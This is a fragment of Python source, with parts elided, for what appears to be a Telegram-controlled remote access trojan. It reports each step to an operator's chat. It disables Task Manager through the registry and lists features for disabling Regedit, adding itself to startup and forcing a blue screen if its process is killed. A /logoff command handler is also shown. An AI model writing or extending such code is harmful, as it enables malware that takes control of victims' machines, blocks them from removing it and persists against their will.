...
bot.send_message(TelegramChatID, "_create a folder to save temp files_...", parse_mode='Markdown')
...
bot.send_message(TelegramChatID, "_Run as Administrator_...", parse_mode='Markdown')
...
bot.send_message(TelegramChatID, "_Disables TaskManager_...", parse_mode='Markdown')
# Disables TaskManager

if DisableTaskManager is True:

	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
		bot.send_message(TelegramChatID, "_taskmgr.exe is already disabled_...", parse_mode='Markdown')

	else:
		if Admin() is False:
			bot.send_message(TelegramChatID, "_This function requires admin rights_...", parse_mode='Markdown')

		if Admin():
			RegeditDisableTaskManager()
			open(Directory + 'RegeditDisableTaskManager', 'a').close()
			bot.send_message(TelegramChatID, "_taskmgr.exe has been disabled_...", parse_mode='Markdown')



bot.send_message(TelegramChatID, "_Disables Regedit_...", parse_mode='Markdown')
# Disables Regedit
...
bot.send_message(TelegramChatID, "_Add to startup_...", parse_mode='Markdown')
...
bot.send_message(TelegramChatID, "_Protect process with BSoD (if killed)_...", parse_mode='Markdown')
...
@bot.message_handler(regexp='/logoff')
def logoffTeleg(command):
	SendMessage(command, '*Logoff* command received!')
	UnsetProtection()
	Logoff()
